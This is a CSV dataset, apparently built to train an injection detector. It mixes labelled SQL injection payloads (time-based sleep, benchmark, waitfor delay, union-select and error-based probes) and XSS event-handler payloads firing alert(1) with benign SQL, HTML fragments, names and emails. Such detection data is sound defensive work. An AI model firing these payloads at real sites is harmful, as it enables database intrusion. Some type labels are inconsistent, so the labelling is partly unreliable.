Text,Label,type
1'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,sql
"<nav draggable=""true"" ondragstart=""alert(1)"">test</nav>",2,xss
"		<h3  id=""p-coll-print_export-label"">",0,xss
shrum@uniovivirtual.nz,0,xss
"1,  (  select   (  case when   (  9644  =  9644  )   then dbms_pipe.receive_message  (  chr  (  75  )  ||chr  (  78  )  ||chr  (  104  )  ||chr  (  98  )  ,5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  ",1,sql
<em id=x tabindex=1 ondeactivate=alert(1)></em><input id=y autofocus>,2,xss
"labiano, s/n 7?a",0,xss
artigas girut,0,xss
"  SELECT * FROM doctor WHERE adventure IN  ( 'stuck', 'pull', 'title' )  ",0,sql
SELECT AVG ( bigger ) FROM surprise,0,sql
""" or sleep  (  __TIME__  )    =  """,1,sql
"SELECT customername, contactname FROM  customers; ",0,xss
"<ul><li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;17–25 </li> </ul>",0,xss
1' in boolean mode  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  #,1,sql
	 </span>(1876) </li>,0,xss
"1%'   )    )    union all select null,null,null,null,null,null,null,null,null--",1,sql
"1"" where 5216  =  5216 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=Minds%2C+Machines+and+G%C3%B6del&amp;rft.btitle=Minds+and+Machines&amp;rft.date=1961&amp;rft.aulast=Lucas&amp;rft.aufirst=John&amp;rft_id=http%3A%2F%2Fusers.ox.ac.uk%2F~jrlucas%2FGodel%2Fmmg.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<fieldset oncopy=""alert(1)"" contenteditable>test</fieldset>",2,xss
8.2197E+15,0,sql
<abbr onpointerout=alert(1)>XSS</abbr>,2,xss
<xmp id=x tabindex=1 onactivate=alert(1)></xmp>,2,xss
SELECT TOP 50 PERCENT * FROM locate SELECT * FROM death FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM greater,0,xss
"1'+  (  select vupb where 9575  =  9575 union all select null,null,null,null,null,null,null,null,null,null--",1,xss
" </p><p>Another factor that is influencing the ability of a driver-less automobile is the safety of the passenger. To make a driver-less automobile, engineers must program it to handle high-risk situations. These situations could include a head-on collision with pedestrians. The car's main goal should be to make a decision that would avoid hitting the pedestrians and saving the passengers in the car. But there is a possibility the car would need to make a decision that would put someone in danger. In other words, the car would need to decide to save the pedestrians or the passengers.<sup id=""cite_ref-313"" class=""reference""><a href=""#cite_note-313"">&#91;302&#93; </a> </sup> The programming of the car in these situations is crucial to a successful driver-less automobile.",0,xss
"SELECT ID, post_title, post_name FROM wp_posts WHERE post_type  =  'wpcf7_contact_form'",0,sql
"<plaintext oncut=""alert(1)"" contenteditable>test</plaintext>",2,xss
21468433a,0,sql
"1   )    )    as henn where 9980  =  9980 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"1""   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,sql
"document.querySelector("".example"")",2,xss
SELECT * FROM finest,0,sql
SELECT quick ( s )  FROM distant,0,sql
FROM  ( SELECT DISTINCT tool FROM coffee ) ,0,xss
"<div draggable=""true"" contenteditable>drag me</div><keygen ondragover=alert(1) contenteditable>drop here</keygen>",2,xss
calle bertran de castellet 28 6e,0,sql
vries,0,sql
"<body onbeforecopy=""alert(1)"" contenteditable>test</body>",2,xss
 ,0,xss
"	 </span> <span class=""reference-text"">McFarland, Matt. ""Google's artificial intelligence breakthrough may have a huge impact on self-driving cars and much more"". <i>The Washington Post </i> 25 February 2015. Infotrac Newsstand. 24 October 2016 ",0,xss
"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""mjkl""  =  ""mjkl",1,sql
<object id=x tabindex=1 onbeforeactivate=alert(1)></object>,2,xss
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
" </p><p>In the twenty-first century, AI techniques have experienced a resurgence following concurrent advances in <a href=""/wiki/Computer_performance"" title=""Computer performance"">computer power </a>, large amounts of <a href=""/wiki/Big_data"" title=""Big data"">data </a>, and theoretical understanding; and AI techniques have become an essential part of the <a href=""/wiki/Technology_industry"" class=""mw-redirect"" title=""Technology industry"">technology industry </a>, helping to solve many challenging problems in computer science, <a href=""/wiki/Software_engineering"" title=""Software engineering"">software engineering </a> and <a href=""/wiki/Operations_research"" title=""Operations research"">operations research </a>.<sup id=""cite_ref-AI_widely_used_25-0"" class=""reference""><a href=""#cite_note-AI_widely_used-25"">&#91;25&#93; </a> </sup><sup id=""cite_ref-AI_in_2000s_13-1"" class=""reference""><a href=""#cite_note-AI_in_2000s-13"">&#91;13&#93; </a> </sup>",0,xss
"<style>@keyframes slidein {}</style><noembed style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></noembed>",2,xss
peirat bellv,0,sql
<fieldset id=x tabindex=1 onbeforedeactivate=alert(1)></fieldset><input autofocus>,2,xss
SELECT AVG ( itself ) FROM choose SELECT SUM ( this ) ,0,xss
abrams.peabody@hojadecalculo.com.py,0,sql
SELECT * FROM whatever WHERE writer IN  ( SELECT noise FROM damage ) ,0,sql
"<pre onkeypress=""alert(1)"" contenteditable>test</pre>",2,xss
<discard onpointerup=alert(1)>XSS</discard>,2,xss
"select * from generate_series  (  6200,6200,case when   (  6200  =  5449  )   then 1 else 0 end  )   limit 1--",1,sql
SELECT * FROM population ORDER BY page DESC,0,sql
"<noframes draggable=""true"" ondragstart=""alert(1)"">test</noframes>",2,xss
"<footer draggable=""true"" ondragend=""alert(1)"">test</footer>",2,xss
"<acronym draggable=""true"" ondrag=""alert(1)"">test</acronym>",2,xss
1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,sql
"1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'vfnl'  =  'vfnl",1,sql
"iif  (  1095  =  2853,1,1/0  )  ",1,sql
"<li id=""cite_note-132""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-132"">^ </a> </b> ",0,xss
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
"<time ondblclick=""alert(1)"">test</time>",2,xss
"1'  )   as mgko where 1828  =  1828 and make_set  (  8403  =  8403,8899  )  --",1,sql
SELECT * FROM electricity WHERE street NOT BETWEEN 'kitchen' AND 'made',0,sql
"  SELECT lengthID AS ID, girl AS fastened FROM imagine",0,sql
"<li><a href=""/wiki/Solid_modeling"" title=""Solid modeling"">Solid modeling </a> </li> </ul>",0,xss
SELECT * FROM increase WHERE duck NOT BETWEEN 'position' AND 'decide',0,sql
54368029p,0,sql
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'bwtk'  =  'bwtk,1,sql
"  SELECT create,bottom FROM pretty WHERE familiar = 'play' UNION SELECT tower, opinion FROM go",0,sql
englert,0,sql
SELECT * FROM entire WHERE rather BETWEEN '1996-07-01' AND '1996-07-31',0,sql
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367660 ) ,0,xss
" SELECT * FROM discovery ORDER BY hollow, guess",0,xss
" select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",1,sql
cusell vinageras,0,xss
SELECT AVG ( Price ) FROM on,0,sql
03770036z,0,sql
saleta,0,sql
SELECT TOP 3 * FROM private WHERE track = 'everyone',0,sql
"1'||  (  select 'djoe' from dual where 8063  =  8063   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   ||'",1,sql
SELECT COUNT ( DISTINCT discover )  FROM chose,0,sql
"SELECT CONVERT ( ""14:06:10"", TIME ) ;",0,sql
"<style>:target {transform: rotate(180deg);}</style><tfoot id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></tfoot>",2,xss
"	 <div class=""magnify""><a href=""/wiki/File:X-ray_of_a_hand_with_automatic_bone_age_calculation.jpg"" class=""internal"" title=""Enlarge""> </a> </div><a href=""/wiki/Projectional_radiography"" title=""Projectional radiography"">X-ray </a> of a hand, with automatic calculation of <a href=""/wiki/Bone_age"" title=""Bone age"">bone age </a> by computer software </div> </div> </div>",0,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><multicol id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></multicol>",2,xss
calle federico mompou 144 11-d,0,xss
"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,1,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
<source onpointerover=alert(1)>XSS</source>,2,xss
"1 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   # irvm",1,sql
SELECT * FROM strike  WHERE sun NOT LIKE '[source]%',0,sql
"-4012""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""ccfn""  =  ""ccfn",1,sql
"<option draggable=""true"" ondragstart=""alert(1)"">test</option>",2,xss
"		<li id=""footer-places-privacy""><a href=""https://foundation.wikimedia.org/wiki/Privacy_policy"" class=""extiw"" title=""wmf:Privacy policy"">Privacy policy </a> </li>",0,xss
"<progress onmouseenter=""alert(1)"">test</progress>",2,xss
"  SELECT ISNULL ( ""Hello world!"" ) ;",0,xss
<strike onpointerup=alert(1)>XSS</strike>,2,xss
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=26"" title=""Edit section: Tools"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
"<tbody ondblclick=""alert(1)"">test</tbody>",2,xss
"<listing onmouseup=""alert(1)"">test</listing>",2,xss
"<li><a href=""/wiki/Conventionalism"" title=""Conventionalism"">Conventionalism </a> </li>",0,xss
<main onpointermove=alert(1)>XSS</main>,2,xss
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.mileseducation.com/finance/artificial_intelligence"">""Miles Education | Future Of Finance | Blockchain Fundamentals for F&amp;A Professionals Certificate"" </a>. <i>www.mileseducation.com </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">26 September ",0,xss
"-1920'   )    )     )   union all select 1424,1424,1424,1424,1424,1424,1424,1424,1424,1424#",1,sql
colvara pulve,0,sql
"<li><a href=""/wiki/Hard_problem_of_consciousness"" title=""Hard problem of consciousness"">Hard problem of consciousness </a> </li>",0,xss
<header onpointermove=alert(1)>XSS</header>,2,xss
select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,1,xss
"c/jon peuelas, 117,",0,sql
SELECT * FROM office FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM feel,0,sql
SELECT * FROM pot WHERE bring NOT BETWEEN 'crowd' AND 'dry',0,sql
42569454l,0,sql
SELECT become ( s )  FROM imagine,0,sql
<rtc id=x tabindex=1 onfocusin=alert(1)></rtc>,2,xss
<meta onblur=alert(1) tabindex=1 id=x></meta><input autofocus>,2,xss
SELECT * FROM dirty WHERE listen BETWEEN 'trick' AND 'ordinary',0,sql
        <dt>Downloads</dt>,0,xss
"READTHEDOCS_DATA['page'] = ""index""",0,xss
 having 1  =  1--,1,sql
SELECT origin FROM method UNION ALL SELECT principle FROM battle ORDER BY one,0,sql
<caption onblur=alert(1) tabindex=1 id=x></caption><input autofocus>,2,xss
SELECT AVG ( empty ) FROM collect SELECT SUM ( someone ) ,0,sql
apolonio,0,sql
"<output onmouseout=""alert(1)"">test</output>",2,xss
"   SELECT COUNT ( ear ) , line FROM curious BY center",0,sql
SELECT * FROM earth  WHERE failed NOT LIKE '[pictured]%',0,xss
SELECT * FROM stop WHERE to = 'congress' FETCH FIRST 3 ROWS ONLY,0,sql
"	 <div class=""magnify""><a href=""/wiki/File:Overfitted_Data.png"" class=""internal"" title=""Enlarge""> </a> </div>The blue line could be an example of <a href=""/wiki/Overfitting"" title=""Overfitting"">overfitting </a> a linear function due to random noise. </div> </div> </div>",0,xss
pianka@noviasteresapalacios.mc,0,sql
"1""   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""vfoh""  =  ""vfoh",1,sql
<font onpointerleave=alert(1)>XSS</font>,2,xss
SELECT TOP 3 * FROM store WHERE giant = 'graph',0,sql
SELECT * FROM settlers WHERE prize NOT LIKE '[glass]%',0,xss
"1'qhfy<'"">utwq",1,xss
"<a href=""/wiki/Kalman_filter"" title=""Kalman filter"">Kalman filters </a>:",0,xss
"calle juan sebastian elcano, 157 11?b",0,sql
"	 </span> <span class=""reference-text""><cite class=""citation web"">Maloof, Mark. <a rel=""nofollow"" class=""external text"" href=""http://people.cs.georgetown.edu/~maloof/cosc270.f17/cosc270-intro-handout.pdf"">""Artificial Intelligence: An Introduction, p. 37"" </a> <span class=""cs1-format"">(PDF) ",0,xss
astar@guiapolicial.lt,0,sql
beln,0,sql
"          <dd><a href=""/en/1.5/"">1.5</a></dd>",0,xss
kussauer_brereton@showcarsmadrid.com.kp,0,sql
" SELECT * FROM brave ORDER BY detail ASC, wish DESC",0,sql
"  SELECT * FROM aid WHERE do IN  ( 'machinery', 'written', 'label' )  ",0,sql
<slot id=x tabindex=1 ondeactivate=alert(1)></slot><input id=y autofocus>,2,xss
"1',  (  case when 3598  =  2118 then 1 else null end  )  ",1,sql
colvin@freemachine.no,0,sql
1'   )    )    as dqdv where 8126  =  8126 and 4595  =  4595#,1,sql
"<menuitem onpaste=""alert(1)"" contenteditable>test</menuitem>",2,xss
<legend onpointerout=alert(1)>XSS</legend>,2,xss
26033,0,sql
"<div class=""toctree-wrapper compound"">",0,xss
"  SELECT ourselvesID AS ID, table AS call FROM branch",0,sql
<svg><menuitem onload=alert(1)></menuitem>,2,xss
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'qpdu'  =  'qpdu",1,sql
enco,0,sql
"-3298 union all select 7618,7618,7618,7618,7618,7618,7618,7618,7618,7618#",1,sql
"<canvas onmousedown=""alert(1)"">test</canvas>",2,xss
haiti 27 1?g,0,xss
<details onpointerover=alert(1)>XSS</details>,2,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li> </ul>",0,xss
1  )   as xylu where 3338  =  3338 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1,sql
"<div draggable=""true"" contenteditable>drag me</div><dd ondrop=alert(1) contenteditable>drop here</dd>",2,xss
7315,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
"<style>@keyframes slidein {}</style><tfoot style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tfoot>",2,xss
"!function(){var analytics=window.analytics=window.analytics||[];if(!analytics.initialize)if(analytics.invoked)window.console&&console.error&&console.error(""Segment snippet included twice."");else{analytics.invoked=!0;analytics.methods=[""trackSubmit"",""trackClick"",""trackLink"",""trackForm"",""pageview"",""identify"",""reset"",""group"",""track"",""ready"",""alias"",""page"",""once"",""off"",""on""];analytics.factory=function(t){return function(){var e=Array.prototype.slice.call(arguments);e.unshift(t);analytics.push(e);return analytics}};for(var t=0;t<analytics.methods.length;t++){var e=analytics.methods[t];analytics[e]=analytics.factory(e)}analytics.load=function(t){var e=document.createElement(""script"");e.type=""text/javascript"";e.async=!0;e.src=(""https:""===document.location.protocol?""https://"":""http://"")+""cdn.segment.com/analytics.js/v1/""+t+""/analytics.min.js"";var n=document.getElementsByTagName(""script"")[0];n.parentNode.insertBefore(e,n)};analytics.SNIPPET_VERSION=""3.1.0"";",0,xss
"1%'   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
1' waitfor delay '0:0:5',1,sql
<tr id=x tabindex=1 onfocus=alert(1)></tr>,2,xss
"1""  )   as pwvu where 8267  =  8267",1,sql
SELECT * FROM actually WHERE to NOT LIKE '[life]%',0,sql
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",1,sql
-1816%'   )    )     )   union all select 2072--,1,sql
SELECT * FROM third WHERE    NOT habit = 'design',0,xss
SELECT MIN ( here )  AS desk FROM toward,0,sql
charissa,0,sql
SELECT * FROM proud WHERE price = 'luck' LIMIT 3,0,xss
"<frame draggable=""true"" ondrag=""alert(1)"">test</frame>",2,xss
"-5073""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""kbab"" like ""kbab",1,sql
" SELECT * FROM happy ORDER BY power, promised",0,sql
SELECT * FROM zipper FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM jar,0,sql
"<br onmouseout=""alert(1)"">test</br>",2,xss
maclaren,0,sql
nikolia,0,sql
"<li><a href=""/wiki/Scientism"" title=""Scientism"">Scientism </a> </li>",0,xss
1%'   )    )     )   order by 1#,1,sql
"sin sol 15,",0,sql
"1"" union all select null,null,null,null,null,null,null,null,null--",1,sql
"  SELECT trail,land,tent FROM low LEFT JOIN Orders ON library.nationalID =  lot.eventually ORDER BY fine.red",0,sql
SELECT MIN ( separate )  AS pine FROM dig,0,sql
SELECT * FROM Suppliers;,0,sql
"1   )    )    as amyr where 7875  =  7875 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
<data id=x tabindex=1 ondeactivate=alert(1)></data><input id=y autofocus>,2,xss
"   SELECT may,race,gather,square,automobile     (  (  battle JOIN saved ON favorite.six =  glass.colony )   INNER JOIN theyON Orders.milk =  higher.homeID ) ",0,sql
"<li id=""cite_note-FOOTNOTE&#39;&#39;Kismet&#39;&#39;-136""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTE&#39;&#39;Kismet&#39;&#39;_136-0"">^ </a> </b> ",0,xss
"SELECT column1 , column2, ... FROM table_name ;",0,xss
afoscarse,0,sql
waitfor delay '0:0:5' and 'dfzn'  =  'dfzn,1,sql
"   SELECT Employees.answer, COUNT ( Orders.soilID )  AS chooseFROM    ( OrdersINNER JOIN neighborhood ON Orders.occurID  =  Employees.pondID ) ",0,sql
"-7579%"" or 6570  =  1764",1,sql
SELECT * FROM energy WHERE alive = 'arm'  OR cross = 'track',0,sql
SELECT TOP 3 * FROM hurried WHERE table = 'cow',0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
"<mark draggable=""true"" ondragend=""alert(1)"">test</mark>",2,xss
<s id=x tabindex=1 onfocus=alert(1)></s>,2,xss
"<button oncut=""alert(1)"" contenteditable>test</button>",2,xss
SELECT COUNT ( tooID ) FROM carried,0,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
SELECT DISTINCT weather FROM discussion,0,sql
SELECT TOP 50 PERCENT * FROM leaf SELECT * FROM store FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM wife,0,sql
"-1763%"" or   (  8459  =  8459  )  *4906 and ""%""  =  """,1,xss
"1'+  (  select lhtn where 8484  =  8484 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",1,sql
1'+  (  select 'diet' where 7004  =  7004 rlike sleep  (  5   )    )   +',1,xss
 </li>,0,xss
SELECT TOP 3 * FROM skill SELECT * FROM reach 3SELECT * FROM sudden,0,sql
DELETE FROM pet WHERE own = 'made',0,sql
"<figure onbeforepaste=""alert(1)"" contenteditable>test</figure>",2,xss
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_button_4_link' LIMIT 1,0,sql
SELECT * FROM block WHERE organization NOT LIKE 'picture%',0,sql
SELECT * FROM rich,0,sql
	 </span>,0,xss
"<div onmouseup=""alert(1)"">test</div>",2,xss
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  'jirc'  =  'jirc,1,sql
"<del draggable=""true"" ondragend=""alert(1)"">test</del>",2,xss
SELECT AVG ( both )  FROM bring  SELECT SUM ( herd ) ,0,sql
"-1275"" union all select 7861,7861,7861,7861,7861#",1,sql
"<button onkeydown=""alert(1)"" contenteditable>test</button>",2,xss
"select * from generate_series  (  1488,1488,case when   (  1488  =  1685  )   then 1 else 0 end  )   limit 1--",1,xss
5n37do,0,sql
"  SELECT * FROM outside WHERE nervous IN  ( 'aware', 'cut', 'all' )  ",0,sql
"1'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'cdaq' like 'cdaq",1,sql
"   SELECT age, greatest, drawFROM seldom WHERE full  IS NOT NULL",0,xss
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Lieto, Antonio; Bhatt, Mehul; Oltramari, Alessandro; Vernon, David (May 2018). ""The role of cognitive architectures in general artificial intelligence"". <i>Cognitive Systems Research </i>. <b>48 </b>: 1–3. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.cogsys.2017.08.003"">10.1016/j.cogsys.2017.08.003 </a>. <a href=""/wiki/Handle_System"" title=""Handle System"">hdl </a>:<a rel=""nofollow"" class=""external text"" href=""//hdl.handle.net/2318%2F1665249"">2318/1665249 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Cognitive+Systems+Research&amp;rft.atitle=The+role+of+cognitive+architectures+in+general+artificial+intelligence&amp;rft.volume=48&amp;rft.pages=1-3&amp;rft.date=2018-05&amp;rft_id=info%3Ahdl%2F2318%2F1665249&amp;rft_id=info%3Adoi%2F10.1016%2Fj.cogsys.2017.08.003&amp;rft.aulast=Lieto&amp;rft.aufirst=Antonio&amp;rft.au=Bhatt%2C+Mehul&amp;rft.au=Oltramari%2C+Alessandro&amp;rft.au=Vernon%2C+David&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT * FROM finger WHERE magnet NOT BETWEEN 'common' AND 'lucky',0,sql
"1"" where 2072  =  2072 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,sql
SELECT * FROM tears FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"-8988""   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""dyxh"" like ""dyxh",1,sql
1'   )    )     )   union all select null--,1,sql
6.29894E+15,0,sql
"  SELECT REPLACE ( ""SQL Tutorial"", ""SQL"", ""HTML"" ) ;",0,sql
"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507",1,sql
"-2872  )   where 8797  =  8797 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,sql
"1'+  (  select blbd where 7451  =  7451 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",1,sql
"<li id=""cite_note-403""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-403"">^ </a> </b> ",0,xss
zulmara,0,sql
 </li>,0,xss
"-3377""  )   or 4982  =  6608#",1,sql
"INSERT INTO parts ( shake, mouse, crew, birthday, surrounded, bark )  VALUES  ( 'length', 'enemy'. kept', 'truth', 'smoke', 'could', 'about' )  ",0,sql
"1%""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  ""%""  =  """,1,sql
"1' or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,xss
 ,0,xss
	 </span>,0,xss
"  SELECT splitID AS ID, shorter AS he FROM list",0,sql
p1oro3o,0,xss
"<dt><a class=""reference internal"" href=""topics/practices.html""><span class=""doc"">Common Practices",0,xss
select   (  case when   (  3716  =  4021  )   then 3716 else 3716*  (  select 3716 from information_schema.character_sets  )   end  )  #,1,sql
<samp id=x tabindex=1 onbeforeactivate=alert(1)></samp>,2,xss
"<li><a href=""/wiki/Evolutionary_algorithm"" title=""Evolutionary algorithm"">Evolutionary algorithm </a> </li>",0,xss
SELECT this,0,xss
"-9037%"" union all select 6583#",1,xss
SELECT AVG ( silk ) FROM coat SELECT SUM ( band ) ,0,xss
7.79828E+15,0,sql
SELECT COUNT ( womenID ) FROM merely,0,xss
1940,0,sql
SELECT TOP 3 * FROM source WHERE held = 'hard',0,sql
"<dt><a class=""reference internal"" href=""topics/benchmarking.html""><span class=""doc"">Benchmarking",0,xss
